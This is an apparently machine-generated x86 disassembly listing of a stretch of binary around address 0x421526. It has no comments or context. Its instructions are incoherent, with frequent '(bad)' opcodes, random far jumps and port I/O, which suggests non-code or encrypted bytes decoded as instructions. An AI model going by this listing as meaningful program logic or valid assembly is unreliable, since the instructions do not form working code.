  421526:	jmp    0x337b:0x242c7987
  42152d:	call   DWORD PTR [edx]
  42152f:	(bad)  [eax]
  421531:	push   0x69
  421533:	stc    
  421534:	in     eax,dx
  421535:	ror    BYTE PTR [ebx-0x45],cl
  421538:	adc    al,BYTE PTR [ebx]
  42153a:	push   ss
  42153b:	data16 arpl WORD PTR [ebp-0x27],cx
  42153f:	mov    dl,0x81
  421541:	add    BYTE PTR [esi],0x81
  421544:	sub    ecx,DWORD PTR [edx+0x6b4983bd]
  42154a:	in     eax,dx
  42154b:	sub    DWORD PTR [ebx+0x56],ebx
  42154e:	loop   0x421544
  421550:	mov    cs,ebp
  421552:	leave  
  421553:	sti    
  421554:	xor    al,0xe0
  421556:	popa   
  421557:	fisub  DWORD PTR [esi-0x68]
  42155a:	mov    ds:0x6bf54e9b,al
  42155f:	shl    DWORD PTR [ecx],1
  421561:	repz data16 loop 0x4214ef
  421565:	loop   0x421542
  421567:	cld    
  421568:	enter  0xf977,0x60
  42156c:	jbe    0x42157d
  42156e:	xchg   ebx,eax
  42156f:	retf   0x835
  421572:	jle    0x421575
  421574:	sub    al,0xcb
  421576:	fnstcw WORD PTR [edx]
  421578:	xor    al,0x1c
  42157a:	jmp    0x421505
  42157c:	and    eax,0x1710d5cd
  421581:	adc    ah,BYTE PTR [ebp+0x70]
  421584:	cld    
  421585:	cmp    BYTE PTR [edi],al
  421587:	pop    edx
  421588:	mov    edi,0xcf7a6015
  42158d:	arpl   WORD PTR [ebp+0x4fde5088],ax
  421593:	xchg   edi,eax
  421594:	icebp  
  421595:	call   DWORD PTR [edi]
  421597:	ret    
  421598:	dec    edx
  421599:	jae    0x42157b
  42159b:	out    dx,al
  42159c:	and    dh,ah
  42159e:	jbe    0x4215d0
  4215a0:	hlt    
  4215a1:	jnp    0x421582
  4215a3:	addps  xmm3,XMMWORD PTR [edx-0x94222d3]
  4215aa:	mov    al,0x52
  4215ac:	fwait
  4215ad:	int    0x4
  4215af:	out    0x35,al
  4215b1:	mov    DWORD PTR [eax+0x11],ecx
  4215b4:	inc    ebp
  4215b5:	pop    ebx
  4215b6:	pop    esi
  4215b7:	xor    ch,al
  4215b9:	test   DWORD PTR [ebx],ebp
  4215bb:	or     eax,0x2d71354a
  4215c0:	cmp    DWORD PTR [eax-0x55],0x81863eff
  4215c7:	sbb    eax,0x5ebae56
  4215cc:	fsubr  st,st(1)
  4215ce:	mov    ch,0xb
  4215d0:	add    eax,0xadb645e4
  4215d5:	outs   dx,DWORD PTR ds:[esi]
  4215d6:	das    
  4215d7:	into   
  4215d8:	mov    dl,0xfc
  4215da:	icebp  
  4215db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215dc:	lods   al,BYTE PTR ds:[esi]
  4215dd:	xchg   BYTE PTR [edx+0x12],ch
  4215e0:	pusha  
  4215e1:	lea    esi,[ecx-0x44]
  4215e4:	sbb    ah,BYTE PTR [edi-0x2844cb0b]
  4215ea:	fmul   QWORD PTR [esi]
  4215ec:	and    al,bl
  4215ee:	sub    al,0xfa
  4215f0:	jno    0x42164d
  4215f2:	sahf   
  4215f3:	add    eax,0xcb4e9035
  4215f8:	sbb    BYTE PTR [edi],0x17
  4215fb:	mov    cl,BYTE PTR ds:0xa1f26e20
  421601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421602:	cs (bad) 
  421604:	(bad)  
  421605:	test   eax,0x37caf844
  42160a:	mov    esi,0x6800896
  42160f:	xor    esi,esp
  421611:	or     ebp,esp
  421613:	inc    eax
  421614:	pop    ebx
  421615:	xchg   BYTE PTR [edx-0x6b],cl
  421618:	mov    bh,0x24
  42161a:	sub    eax,0x9368cc47
  42161f:	pop    es
  421620:	mov    WORD PTR [ebx-0x1bd8a6e0],ds
  421626:	fwait
  421627:	add    BYTE PTR [ebx],ah
  421629:	jns    0x421630
  42162b:	jne    0x4215cd
  42162d:	adc    ah,bh
  42162f:	dec    ebx
  421630:	aaa    
  421631:	cld    
  421632:	inc    ebp
  421633:	sub    DWORD PTR [edx],0x51
  421636:	mov    esi,0x27cc56e4
  42163b:	sbb    BYTE PTR [esi+0xd457b53],0x6c
  421642:	mov    ebx,0xc6ea3571
  421647:	or     al,0x30
  421649:	mov    cl,0xb0
  42164b:	xchg   esp,eax
  42164c:	data16 jl 0x42164a
  42164f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421650:	push   0x5659bcdf
  421655:	ja     0x421606
  421657:	push   ds
  421658:	xchg   edi,eax
  421659:	ins    DWORD PTR es:[edi],dx
  42165a:	mov    dl,0x51
  42165c:	dec    ebx
  42165d:	fstp   TBYTE PTR [ecx+edx*4+0x2d]
  421661:	xchg   ecx,eax
  421662:	in     al,dx
  421663:	or     dh,BYTE PTR [edx-0x2628b5ee]
  421669:	rcr    ch,0xa4
  42166c:	xor    esp,0x52
  42166f:	in     eax,0xa6
  421671:	push   ebx
  421672:	sub    eax,0xd933f7b5
  421677:	imul   esp,ebp,0xe7d34afb
  42167d:	retf   0x98cb
  421680:	jmp    0x421694
  421682:	or     esi,DWORD PTR [ecx]
  421684:	pop    ebx
  421685:	add    DWORD PTR [ebx+0x778c0f33],eax
  42168b:	fisttp DWORD PTR [ecx]
  42168d:	mov    ch,0xc
  42168f:	ror    BYTE PTR [eax+0x64],0x7a
  421693:	cmp    cl,BYTE PTR [edx+0x4d]
  421696:	sub    DWORD PTR [edi-0x72],0xffffffef
  42169a:	jae    0x4216e7
  42169c:	repnz sbb al,BYTE PTR [edi]
  42169f:	pop    ds
  4216a0:	fiadd  DWORD PTR fs:[eax-0x6a]
  4216a4:	jae    0x42167d
  4216a6:	lods   eax,DWORD PTR ds:[esi]
  4216a7:	add    al,0x6c
  4216a9:	lods   al,BYTE PTR es:[esi]
  4216ab:	dec    esp
  4216ac:	jmp    0x372b:0x347d5c41
  4216b3:	js     0x421715
  4216b5:	push   edi
  4216b6:	inc    ebx
  4216b7:	mov    BYTE PTR ds:0xa5bdf55c,cl
  4216bd:	retf   0xbdec
  4216c0:	bnd jp 0x421655
  4216c3:	mov    esp,0x520486d
  4216c8:	inc    ebx
  4216c9:	xor    ebx,DWORD PTR [ecx+0x57]
  4216cc:	jmp    0x330f:0x1a4d55b7
  4216d3:	fst    st(5)
  4216d5:	push   es
  4216d6:	mov    edi,0x8147b308
  4216db:	xchg   DWORD PTR [esi+0x13b7644e],esp
  4216e1:	test   DWORD PTR [ecx-0x12],ebx
  4216e4:	xchg   esi,eax
  4216e5:	call   0x8b82:0xe408e63c
  4216ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216ed:	mov    esi,esp
  4216ef:	js     0x4216a6
  4216f1:	jmp    0x97d51e2b
  4216f6:	mov    eax,0x41a7fc62
  4216fb:	call   0x47a49689
  421700:	jae    0x4216bf
  421702:	fnstsw WORD PTR [edi]
  421704:	cmp    eax,0x99e8d2a4
  421709:	pop    ss
  42170a:	mov    cl,0xfd
  42170c:	mov    edx,0x1e6f6b7b
  421711:	dec    esp
  421712:	pushf  
  421713:	inc    edx
  421714:	inc    eax
  421715:	ror    DWORD PTR [ecx+0x58b3cc15],cl
  42171b:	aas    
  42171c:	mov    dh,0xb8
  42171e:	inc    ebp
  42171f:	inc    edx
  421720:	mov    ch,0x4f
  421722:	(bad)  
  421723:	or     esi,DWORD PTR [edx+0x6cef2f2d]
  421729:	sub    eax,0x8ad8bd75
  42172e:	xor    esp,0xd344c08e
  421734:	dec    BYTE PTR [edi+0x27d1d71d]
  42173a:	lods   al,BYTE PTR ds:[esi]
  42173b:	in     eax,0x70
  42173d:	(bad)  
  421740:	sub    ebp,esp
  421742:	jge    0x421764
  421744:	mov    cl,0x16
  421746:	fsubr  QWORD PTR [ecx-0xf]
  421749:	xchg   esp,eax
  42174a:	lds    ecx,FWORD PTR [ebx]
  42174c:	mov    WORD PTR [eax+0xb],fs
  42174f:	lds    esi,FWORD PTR [ecx+0x72963190]
  421755:	jae    0x4217b8
  421757:	mov    ah,0x69
  421759:	push   ecx
  42175a:	pop    esp
  42175b:	test   eax,0xd5068056
  421760:	test   edx,0x1cc06c16
  421766:	or     eax,0x8e998f6
  42176b:	sbb    BYTE PTR [esi-0x3cdfb5e0],0xdd
  421772:	push   esp
  421773:	into   
  421774:	jp     0x4216f9
  421776:	gs mov al,0xbd
  421779:	jge    0x4217d1
  42177b:	sti    
  42177c:	mov    ebp,0xf4419b97
  421781:	pop    edx
  421782:	in     eax,dx
  421783:	push   ecx
  421784:	test   eax,0xffccaf36
  421789:	fptan  
  42178b:	mov    WORD PTR [edi],ds
  42178d:	or     ebx,edx
  42178f:	xchg   esp,eax
  421790:	xor    BYTE PTR [eax+0x7e],dh
  421793:	sub    al,0xc5
  421795:	and    al,0x95
  421797:	mov    bh,0x3c
  421799:	xor    ebp,eax
  42179b:	xchg   edx,eax
  42179c:	adc    eax,0xa0feb5b1
  4217a1:	es pop esp
  4217a3:	inc    edx
  4217a4:	test   DWORD PTR [ebp+0x51b98b4f],esp
  4217aa:	daa    
  4217ab:	sbb    eax,DWORD PTR [edi+edx*2]
  4217ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217af:	xor    BYTE PTR [ecx+0x746c00c8],cl
  4217b5:	jge    0x4217c0
  4217b7:	sbb    eax,DWORD PTR [eax]
  4217b9:	and    esp,DWORD PTR [edi+0x78892af4]
  4217bf:	pop    edi
  4217c0:	lods   eax,DWORD PTR ds:[esi]
  4217c1:	jl     0x42180c
  4217c3:	adc    ah,BYTE PTR [ecx-0x50f3368c]
  4217c9:	push   ebp
  4217ca:	int3   
  4217cb:	jnp    0x421803
  4217cd:	xchg   edx,eax
  4217ce:	push   esp
  4217cf:	pop    esi
  4217d0:	add    WORD PTR [esi+0x35],di
  4217d4:	cmp    eax,0x30b91674
  4217d9:	div    DWORD PTR [ebx+ebx*8+0x4def3876]
  4217e0:	out    0x65,eax
  4217e2:	inc    esp
  4217e3:	mov    eax,DWORD PTR [esi]
  4217e5:	aam    0x59
  4217e7:	out    0x77,eax
  4217e9:	jnp    0x421819
  4217eb:	or     ebx,DWORD PTR [edx]
  4217ed:	jnp    0x4217ac
  4217ef:	inc    ebx
  4217f0:	xlat   BYTE PTR ds:[ebx]
  4217f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217f2:	fwait
  4217f3:	jle    0x421839
  4217f5:	jp     0x4217b5
  4217f7:	mov    BYTE PTR [edx+0x3a],cl
  4217fa:	imul   esp,DWORD PTR [esi+0x70146ec8],0xffffffdc
  421801:	mov    ecx,0xd2aa043e
  421806:	xchg   ebx,eax
  421807:	enter  0xfc42,0x5a
  42180b:	imul   DWORD PTR [esp+esi*8-0x7217383]
  421812:	and    eax,0x52fc9a2a
  421817:	dec    ecx
  421818:	fstp   QWORD PTR [ebx+esi*8+0x215b1580]
  42181f:	xor    ch,BYTE PTR [ebx-0x54]
  421822:	ss popf 
  421824:	in     al,dx
  421825:	mov    ah,BYTE PTR [esi]
  421827:	push   ebx
  421828:	mov    ecx,?
  42182a:	cmp    eax,DWORD PTR [ebx+0x3f]
  42182d:	pop    esp
  42182e:	pop    ecx
  42182f:	and    BYTE PTR [ecx],ah
  421831:	xor    BYTE PTR [eax+0x535e7f4d],cl
  421837:	pop    ebp
  421838:	and    al,BYTE PTR [edx+eax*2-0x25ea78c2]
  42183f:	shl    bh,cl
  421841:	xor    bl,BYTE PTR [esi-0x1]
  421844:	xchg   ecx,eax
  421845:	jne    0x421873
  421847:	and    BYTE PTR [eax+ebp*8],dl
  42184a:	cmp    eax,edx
  42184c:	das    
  42184d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42184e:	lea    ebx,[esi+0x65]
  421851:	mov    WORD PTR [esp+eiz*4],es
  421854:	xchg   ebp,ecx
  421856:	add    al,0x61
  421858:	fmul   DWORD PTR [ebx+edx*4]
  42185b:	test   al,ch
  42185d:	mov    WORD PTR [edx],ss
  42185f:	cmp    BYTE PTR [ebp+0x32c7858c],dl
  421865:	add    ebp,DWORD PTR [ebp+0x46963acd]
  42186b:	iret   
  42186c:	or     DWORD PTR [ecx+0x268e0009],edx
  421872:	fwait
  421873:	inc    edx
  421874:	cmp    al,bl
  421876:	sbb    bh,0xd6
  421879:	into   
  42187a:	adc    DWORD PTR [edi+ebx*2+0x61],ebx
  42187e:	jne    0x421804
  421880:	retf   0x93d5
  421883:	mov    edi,0x596f5fd4
  421888:	pushf  
  421889:	and    esp,DWORD PTR [edx]
  42188b:	arpl   WORD PTR [edx],ax
  42188d:	jle    0x421870
  42188f:	push   ecx
  421890:	arpl   WORD PTR [ecx+0x2f],bp
  421893:	dec    edx
  421894:	jmp    0xb9d5:0xc6db850f
  42189b:	add    DWORD PTR [ebx],0x11a39b99
  4218a1:	or     eax,0x49e6a454
  4218a6:	test   eax,0xe64409e3
  4218ab:	sahf   
  4218ac:	das    
  4218ad:	and    ah,BYTE PTR [ebp-0x1a]
  4218b0:	repz pop esi
  4218b2:	or     DWORD PTR [esi],ebp
  4218b4:	stos   BYTE PTR es:[edi],al
  4218b5:	push   0x23
  4218b7:	mov    ah,BYTE PTR [edi]
  4218b9:	mov    ebx,0xe6e0ca68
  4218be:	mov    ss,WORD PTR [edi]
  4218c0:	adc    bh,BYTE PTR [esi]
  4218c2:	sub    al,0xf3
  4218c4:	add    eax,0x1f7b9eb7
  4218c9:	push   0x39c6d9a3
  4218ce:	fndisi(8087 only) 
  4218d0:	popa   
  4218d1:	mov    ds:0xaf837a1e,al
  4218d6:	jne    0x4218ed
  4218d8:	cs xchg edx,eax
  4218da:	test   eax,0xe3f2c9fc
  4218df:	cmp    dh,BYTE PTR [ebx]
  4218e1:	and    DWORD PTR [ecx-0x51],edi
  4218e4:	outs   dx,BYTE PTR ds:[esi]
  4218e5:	(bad)  [ebp-0x76]
  4218e8:	je     0x421886
  4218ea:	iret   
  4218eb:	sub    dl,BYTE PTR [edx-0x5a]
  4218ee:	into   
  4218ef:	mov    ds:0xa0e5feef,al
  4218f4:	rcl    ch,1
  4218f6:	jmp    DWORD PTR [esi-0x2b1c711b]
  4218fc:	int    0xbf
  4218fe:	mov    al,0x4
  421900:	jbe    0x421971
  421902:	sbb    eax,0x42620fbf
  421907:	idiv   BYTE PTR [edx+0x71e4d086]
  42190d:	add    eax,0x2214ea9b
  421912:	leave  
  421913:	cmp    dh,BYTE PTR [ebx+eax*8+0x69eb20a]
  42191a:	ficom  WORD PTR [edi-0x58ab02ba]
  421920:	mov    dh,0x5f
  421922:	js     0x421941
  421924:	push   0xffffff95
  421926:	mov    ebx,0xac620265
  42192b:	xchg   edi,eax
  42192c:	lock cmp bl,0xd3
  421930:	out    0xf,al
  421932:	mov    bh,0x54
  421934:	(bad)  
  421935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421936:	sbb    al,0x92
  421938:	cmc    
  421939:	sbb    dl,cl
  42193b:	mov    eax,DWORD PTR [esi]
  42193d:	outs   dx,DWORD PTR ds:[esi]
  42193e:	scas   eax,DWORD PTR es:[edi]
  42193f:	cmc    
  421940:	sbb    bh,BYTE PTR [ecx+0x3c]
  421943:	div    DWORD PTR [eax-0x3a]
  421946:	out    dx,eax
  421947:	std    
  421948:	fneni(8087 only) 
  42194a:	loop   0x42197e
  42194c:	sbb    ecx,edx
  42194e:	mov    dl,ch
  421950:	es (bad) 
  421954:	xor    bl,al
  421956:	xchg   BYTE PTR [edx-0x6594c9b0],bh
  42195c:	(bad)  
  42195d:	or     al,0x29
  42195f:	rcl    DWORD PTR [eax+0x7c1bd89d],1
  421965:	stc    
  421966:	jp     0x421943
  421968:	xchg   ebx,eax
  421969:	and    BYTE PTR [esi-0x67448dd],0xe
  421970:	out    dx,al
  421971:	inc    ebx
  421972:	in     eax,0xec
  421974:	aad    0xae
  421976:	push   ebx
  421977:	fwait
  421978:	inc    esp
  421979:	add    al,0xf7
  42197b:	sbb    ebp,DWORD PTR [esi-0x23c42ec7]
  421981:	sbb    BYTE PTR [ebx+0x167825bb],bl
  421987:	in     al,0x3a
  421989:	xchg   ebp,eax
  42198a:	in     eax,0x1d
  42198c:	(bad)  
  42198e:	in     al,dx
  42198f:	(bad)  
  421990:	jo     0x4219ce
  421992:	xchg   edi,eax
  421993:	mov    ch,0x6f
  421995:	adc    BYTE PTR [esi+0x7fc8baf6],ah
  42199b:	lahf   
  42199c:	push   ebp
  42199d:	in     al,0x2
  42199f:	jl     0x421997
  4219a1:	push   ebx
  4219a2:	aam    0x16
  4219a4:	scas   al,BYTE PTR es:[edi]
  4219a5:	sbb    eax,0xc7991c1f
  4219aa:	jae    0x42199a
  4219ac:	dec    edx
  4219ad:	aam    0xe
  4219af:	cmp    ch,BYTE PTR [esi+0x1a]
  4219b2:	and    BYTE PTR fs:[eax+0x500ff344],dh
  4219b9:	mov    eax,0xdaaee7b7
  4219be:	(bad)  
  4219c0:	enter  0xff6,0x55
  4219c4:	lods   eax,DWORD PTR ds:[esi]
  4219c5:	push   es
  4219c6:	inc    ebx
  4219c7:	fistp  QWORD PTR [eax+esi*2]
  4219ca:	dec    ebx
  4219cb:	fisttp DWORD PTR [ebx+0x3c4d4791]
  4219d1:	and    BYTE PTR [eax],0xe5
  4219d4:	pop    eax
  4219d5:	aad    0xfe
  4219d7:	enter  0x12f,0x44
  4219db:	mov    WORD PTR [eax+ebx*1],ss
  4219de:	lea    edi,[esi-0x1fb667ea]
  4219e4:	cmp    dh,0xa8
  4219e7:	mov    DWORD PTR [ebp+0x446ad48f],0xcd316f06
  4219f1:	ret    0x1285
  4219f4:	mov    bl,0x43
  4219f6:	shr    BYTE PTR [esi],1
  4219f8:	in     eax,dx
  4219f9:	or     BYTE PTR [edx+0x11761ad5],ah
  4219ff:	pop    ebx
  421a00:	js     0x4219aa
  421a02:	outs   dx,DWORD PTR ds:[esi]
  421a03:	mov    cl,0xe9
  421a05:	xlat   BYTE PTR ds:[ebx]
  421a06:	xchg   BYTE PTR [edx+0x1],dh
  421a09:	sub    BYTE PTR [ecx-0x6a7e606f],dl
  421a0f:	arpl   ax,si
  421a11:	adc    cl,BYTE PTR ds:0x97f2df7c
  421a17:	or     BYTE PTR [edi],cl
  421a19:	lea    eax,[edi-0x7891bdc4]
  421a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a20:	jo     0x4219f3
  421a22:	test   al,0x93
  421a24:	cmp    ah,BYTE PTR [esi+0x5cf264cc]
  421a2a:	xchg   esi,eax
  421a2b:	in     eax,dx
  421a2c:	pop    edx
  421a2d:	adc    BYTE PTR [ecx],bh
  421a2f:	retf   
  421a30:	(bad)  
  421a31:	addr16 mov ds:0x32db,eax
  421a35:	xchg   esp,eax
  421a36:	xchg   edx,eax
  421a37:	enter  0x1b17,0x45
  421a3b:	popf   
  421a3c:	mov    al,0x3
  421a3e:	xor    DWORD PTR [eax+eiz*8-0x5132eb37],edi
  421a45:	sub    BYTE PTR [edi-0x393bfa58],ah
  421a4b:	popa   
  421a4c:	or     esp,ecx
  421a4e:	cmp    edi,DWORD PTR [ecx-0x641aab44]
  421a54:	retf   
  421a55:	push   ecx
  421a56:	imul   ebx,DWORD PTR [ebx],0xffffff92
  421a59:	dec    eax
  421a5a:	dec    esi
  421a5b:	or     ebx,esi
  421a5d:	imul   esp,DWORD PTR [esi],0x44e79672
  421a63:	push   esi
  421a64:	loop   0x421a24
  421a66:	div    dh
  421a68:	icebp  
  421a69:	test   eax,0x6faf649f
  421a6e:	test   eax,0xb934b1a4
  421a73:	ret    0x83c6
  421a76:	fcom   DWORD PTR [ebx-0x1d]
  421a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a7a:	aam    0xa
  421a7c:	lds    eax,FWORD PTR [ebp+0x2c39e92f]
  421a82:	les    esp,FWORD PTR [ecx+0x67792ec2]
  421a88:	fnstcw WORD PTR ds:0x10c52030
  421a8e:	sti    
  421a8f:	imul   ebp,DWORD PTR [ebx],0xffffff89
  421a92:	das    
  421a93:	jns    0x421ad0
  421a95:	xor    ah,BYTE PTR [eax-0x523f5107]
  421a9b:	das    
  421a9c:	ficom  DWORD PTR [ecx]
  421a9e:	outs   dx,BYTE PTR ds:[esi]
  421a9f:	inc    edi
  421aa0:	popa   
  421aa1:	test   eax,0xc77c5e00
  421aa6:	pop    ecx
  421aa7:	outs   dx,BYTE PTR ds:[esi]
  421aa8:	or     al,0xe5
  421aaa:	inc    esi
  421aab:	fsub   QWORD PTR [edi-0x609f9316]
  421ab1:	jge    0x421a63
  421ab3:	or     ebp,DWORD PTR [edx+0x79]
  421ab6:	sti    
  421ab7:	xor    al,0xf6
  421ab9:	push   ds
  421aba:	and    esp,DWORD PTR cs:[ecx+0x26]
  421abe:	int    0xa7
  421ac0:	ret    
  421ac1:	je     0x421a70
  421ac3:	pop    es
  421ac4:	ret    
  421ac5:	jg     0x421b40
  421ac7:	or     al,0xfa
  421ac9:	ins    DWORD PTR es:[edi],dx
  421aca:	loop   0x421b27
  421acc:	test   ebx,ecx
  421ace:	inc    ebx
  421acf:	inc    ebx
  421ad0:	push   ebx
  421ad1:	add    eax,0x1848163e
  421ad6:	cs ins BYTE PTR es:[edi],dx
  421ad8:	pop    es
  421ad9:	popf   
  421ada:	push   es
  421adb:	push   0xdef3e7e6
  421ae0:	stos   DWORD PTR es:[edi],eax
  421ae1:	adc    DWORD PTR [eax],ebp
  421ae3:	inc    esp
  421ae4:	inc    eax
  421ae5:	pop    edx
  421ae6:	pop    eax
  421ae7:	and    al,0x29
  421ae9:	fmul   st,st(2)
  421aeb:	push   ebp
  421aec:	pop    ds
  421aed:	out    dx,eax
  421aee:	ins    BYTE PTR es:[edi],dx
  421aef:	jo     0x421b38
  421af1:	loopne 0x421aad
  421af3:	inc    ebp
  421af4:	xchg   ebp,eax
  421af5:	push   ecx
  421af6:	adc    eax,0xc6db8322
  421afb:	jnp    0x421b44
  421afd:	or     DWORD PTR [ecx+0x2b50a892],ecx
  421b03:	push   ss
  421b04:	ret    0x5f32
  421b07:	pop    ebp
  421b08:	jecxz  0x421ab6
  421b0a:	or     BYTE PTR ds:0x5f2e41f8,ah
  421b10:	aam    0x31
  421b12:	call   0xc752aae1
  421b17:	adc    BYTE PTR [ecx-0x48],dh
  421b1a:	call   0x83fe:0x10d679b0
  421b21:	enter  0xefc6,0x97
  421b25:	push   esi
  421b26:	loop   0x421b5f
  421b28:	inc    esi
  421b29:	inc    esp
  421b2a:	mov    dh,0xbf
  421b2c:	dec    edi
  421b2d:	mov    dh,0x25
  421b2f:	xor    dl,cl
  421b31:	icebp  
  421b32:	xor    eax,0xaf9e23df
  421b37:	xbegin 0x9cdfab11
  421b3d:	mov    ds:0x70b57f32,eax
  421b42:	push   cs
  421b43:	mov    ecx,ebp
  421b45:	retf   0xf116
  421b48:	gs inc ebp
  421b4a:	xchg   edx,eax
  421b4b:	cld    
  421b4c:	test   al,0x1
  421b4e:	and    eax,0x17435f58
  421b53:	test   BYTE PTR [ecx+0x5d],cl
  421b56:	mov    ch,0xf8
  421b58:	jne    0x421b3f
  421b5a:	xor    BYTE PTR [ebx+0x6dee2cc9],dl
  421b60:	mov    edi,0x2f9afa84
  421b65:	jo     0x421b8b
  421b67:	or     eax,0x6d2560e8
  421b6c:	and    esp,esi
  421b6e:	xchg   ecx,eax
  421b6f:	loope  0x421af4
  421b71:	mov    esi,0xa7c83e99
  421b76:	sti    
  421b77:	leave  
  421b78:	jg     0x421ba9
  421b7a:	push   esi
  421b7b:	iret   
  421b7c:	and    dl,BYTE PTR [edi]
  421b7e:	jb     0x421bf9
  421b80:	xchg   edx,eax
  421b81:	fcomp  QWORD PTR [esi+0x1e]
  421b84:	ret    0xc50f
  421b87:	sbb    eax,0x83f884c3
  421b8c:	sti    
  421b8d:	sbb    bl,BYTE PTR [edi+0x33c0be4]
  421b93:	das    
  421b94:	cld    
  421b95:	pusha  
  421b96:	pushf  
  421b97:	in     eax,dx
  421b98:	and    ch,BYTE PTR [ebx+0x36299564]
  421b9e:	dec    ecx
  421b9f:	aad    0xb0
  421ba1:	pop    eax
  421ba2:	lea    ebp,[esi]
  421ba4:	shl    BYTE PTR [eax-0x551f43c3],0x68
  421bab:	enter  0x5317,0x3a
  421baf:	div    BYTE PTR [ebx+0x11]
  421bb2:	cmp    al,0x76
  421bb4:	xlat   BYTE PTR ds:[ebx]
  421bb5:	out    dx,eax
  421bb6:	mov    ebx,0x6b152c65
  421bbb:	jns    0x421b48
  421bbd:	mov    WORD PTR [edx],?
  421bbf:	push   ecx
  421bc0:	mov    esp,0x695749a2
  421bc5:	and    BYTE PTR [eax-0x32352f41],dl
  421bcb:	mov    ah,0x41
  421bcd:	jg     0x421b88
  421bcf:	cwde   
  421bd0:	inc    ebp
  421bd1:	stos   DWORD PTR es:[edi],eax
  421bd2:	mov    BYTE PTR [edx],ah
  421bd4:	hlt    
  421bd5:	and    eax,0xdfaf6571
  421bda:	lds    edx,FWORD PTR [ebp-0x20]
  421bdd:	cmp    DWORD PTR [edx],0xd472f5fc
  421be3:	inc    esi
  421be4:	xchg   esi,eax
  421be5:	push   edx
  421be6:	mov    edi,DWORD PTR [eax]
  421be8:	cld    
  421be9:	sbb    edi,edx
  421beb:	test   BYTE PTR [ebx-0x6a8bbeb6],0x39
  421bf2:	inc    ebp
  421bf3:	hlt    
  421bf4:	aam    0x34
  421bf6:	int    0x18
  421bf8:	mov    cl,al
  421bfa:	test   BYTE PTR [edx-0x2a156c61],al
  421c00:	cmp    al,0xd2
  421c02:	jge    0x421c65
  421c04:	fld    DWORD PTR [edx+0x34]
  421c07:	addr16 pop ds
  421c09:	sub    edi,DWORD PTR [ebx+ebp*2-0x34811d03]
  421c10:	jb     0x421c58
  421c12:	sahf   
  421c13:	mov    ecx,0xdc0c9af8
  421c18:	xor    edx,DWORD PTR [ebp-0x54bee1f6]
  421c1e:	bound  edi,QWORD PTR [ecx+ebx*1]
  421c21:	test   DWORD PTR [eax+0x76c87f85],esp
  421c27:	ds call 0xe592:0x9a4c026e
  421c2f:	mov    bl,0x7d
  421c31:	int    0x38
  421c33:	cmp    eax,edx
  421c35:	sahf   
  421c36:	mov    eax,ds:0x3386da4a
  421c3b:	(bad)  
  421c3c:	sub    al,0xbb
  421c3e:	sub    ebp,edi
  421c40:	repnz cmp al,0xc8
  421c43:	dec    edx
  421c44:	sar    DWORD PTR [ecx-0x3b],1
  421c47:	sbb    al,0xae
  421c49:	in     al,dx
  421c4a:	pop    esi
  421c4b:	inc    ebp
  421c4c:	xor    eax,0x579e0ead
  421c51:	dec    esp
  421c52:	out    dx,eax
  421c53:	es js  0x421c4a
  421c56:	xor    DWORD PTR [eax],esp
  421c58:	outs   dx,DWORD PTR ds:[esi]
  421c59:	(bad)  
  421c5a:	cmp    bl,ch
  421c5c:	lods   al,BYTE PTR ds:[esi]
  421c5d:	call   0x85a4:0x92dd8a62
  421c64:	pop    ss
  421c65:	ficomp WORD PTR [edi]
  421c67:	pop    edi
  421c68:	in     eax,0x85
  421c6a:	arpl   WORD PTR [edx-0x4d],bx
  421c6d:	sbb    al,0x1b
  421c6f:	push   edi
  421c70:	ins    DWORD PTR es:[edi],dx
  421c71:	aad    0x4b
  421c73:	lods   al,BYTE PTR ds:[esi]
  421c74:	mov    ecx,0x3f8df302
  421c79:	push   ebx
  421c7a:	fidiv  WORD PTR [edi-0x859f67f]
  421c80:	mov    esp,0xbd3ccf8d
  421c85:	cmp    BYTE PTR [esi+0x35],al
  421c88:	stc    
  421c89:	into   
  421c8a:	and    eax,0x88add9c4
  421c8f:	jnp    0x421c75
  421c91:	(bad)  
  421c92:	push   ebp
  421c93:	ffree  st(3)
  421c95:	pop    ecx
  421c96:	xchg   esi,eax
  421c97:	out    dx,al
  421c98:	cmp    eax,0x8fb93e4f
  421c9d:	aaa    
  421c9e:	pop    ss
  421c9f:	test   al,0x36
  421ca1:	add    BYTE PTR [esi+0x20122864],0x99
  421ca8:	inc    ebp
  421ca9:	data16 int3 
  421cab:	xor    cl,BYTE PTR [edi+0x44eaffd7]
  421cb1:	lock mov DWORD PTR [eax+0x9],ebx
  421cb5:	test   BYTE PTR [esp+edx*8+0x9],ch
  421cb9:	jmp    0x421d36
  421cbb:	add    eax,0xa2a7e902
  421cc0:	mov    al,0xea
  421cc2:	xchg   DWORD PTR [esi-0x61],esi
  421cc5:	adc    ebx,DWORD PTR [ebp+0xd8a11ce]
  421ccb:	xor    al,0x97
  421ccd:	adc    al,0x37
  421ccf:	stc    
  421cd0:	pop    ecx
  421cd1:	sbb    al,0xc1
  421cd3:	scas   al,BYTE PTR es:[edi]
  421cd4:	cmp    BYTE PTR [eax+0x34faddaf],cl
  421cda:	add    dl,BYTE PTR [edx+0x403e35d6]
  421ce0:	lea    esi,[eax]
  421ce2:	sub    edi,DWORD PTR [edx]
  421ce4:	pop    ss
  421ce5:	aam    0x22
  421ce7:	add    ah,BYTE PTR [esi]
  421ce9:	in     al,dx
  421cea:	(bad)  
  421ceb:	jmp    0x5a1e:0xab3f4ba0
  421cf2:	adc    DWORD PTR [ebx-0x53646cbe],ecx
  421cf8:	or     eax,0x5170d38c
  421cfd:	retf   0x95ca
  421d00:	pop    ecx
  421d01:	sub    BYTE PTR [edi],cl
  421d03:	call   0xb230:0xfda539a
  421d0a:	xchg   esi,eax
  421d0b:	ss mov ch,0xa2
  421d0e:	cmc    
  421d0f:	adc    BYTE PTR [ebp+0x6],bl
  421d12:	(bad)  
  421d13:	loope  0x421cff
  421d15:	xor    BYTE PTR [edi-0x36],ch
  421d18:	and    dh,BYTE PTR [edi+0x7c]
  421d1b:	mov    al,ds:0x259cee49
